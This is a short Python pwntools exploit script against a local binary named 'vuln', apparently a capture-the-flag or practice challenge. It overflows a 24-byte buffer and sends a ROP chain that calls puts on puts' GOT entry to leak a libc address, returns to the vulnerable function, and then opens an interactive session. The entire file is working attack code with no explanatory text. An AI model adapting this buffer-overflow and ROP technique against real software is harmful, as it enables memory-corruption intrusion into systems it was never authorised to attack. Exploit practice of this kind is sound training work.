from pwn import *
from pprint import pprint

# context.arch = 'amd32'

offset = 24

elf = ELF("./vuln")
pprint(elf.symbols)

p = elf.process()

rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['vuln'])

print(p32(elf.symbols["vuln"]))

payload = [
    b"A"*offset,
    # b"BBBB"
    # p32(elf.symbols["vuln"])
    rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)
p.interactive()